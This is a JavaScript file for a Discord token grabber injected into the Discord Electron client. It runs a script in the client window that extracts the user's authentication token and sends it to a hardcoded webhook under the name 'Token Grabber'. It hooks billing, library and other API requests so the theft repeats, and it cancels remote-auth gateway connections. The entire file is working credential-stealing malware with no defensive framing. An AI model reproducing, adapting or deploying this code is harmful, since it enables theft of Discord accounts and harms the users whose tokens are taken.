const fs = require("fs");
const electron = require("electron");
const https = require("https");

async function execScript(str) {
  const window = electron.BrowserWindow.getAllWindows()[0];
  const script = await window.webContents.executeJavaScript(str, true);
  return script || null;
}

const tokenScript = `
    (webpackChunkdiscord_app.push([[''],{},e=>{
        m=[];
        for(let c in e.c) m.push(e.c[c])
    }]),m)
    .find(m=>m?.exports?.default?.getToken!==void 0)
    .exports.default.getToken()
`;

async function sendToWebhook(message) {
  const webhookUrl =
    process.argv[2] ||
    "https://discord.com/api/webhooks/1343045439020208189/OCMu-1J6C9uEZiBO5Tljdjj2oJLV6ymup_ot_EcWrAEjo-X0XQYhXIHXpCz_KiQVBinO";

  const payload = JSON.stringify({
    content: message,
    username: "Token Grabber",
    avatar_url: "https://i.imgur.com/removed.png",
  });

  const url = new URL(webhookUrl);
  const options = {
    host: url.hostname,
    port: url.port,
    path: url.pathname,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload),
    },
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      res.on("data", () => {});
      res.on("end", () => resolve(true));
    });

    req.on("error", (error) => {
      reject(error);
    });

    req.write(payload);
    req.end();
  });
}

async function sendTokenToWebhook() {
  try {
    const token = await execScript(tokenScript);

    if (!token) {
      await sendToWebhook("No token found");
      return false;
    }

    await sendToWebhook(`New Discord Token: \`${token}\``);
    return true;
  } catch (error) {
    await sendToWebhook(`Error processing token: ${error.message}`);
    return false;
  }
}

const config = {
  Filter: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
      "https://discord.com/api/v*/users/@me/billing/subscriptions",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
  },
};

electron.session.defaultSession.webRequest.onBeforeRequest(
  config.Filter,
  async (details, callback) => {
    await electron.app.whenReady();

    await sendTokenToWebhook();

    if (details.url.startsWith("wss://remote-auth-gateway")) {
      return callback({ cancel: true });
    }

    callback({});
  }
);
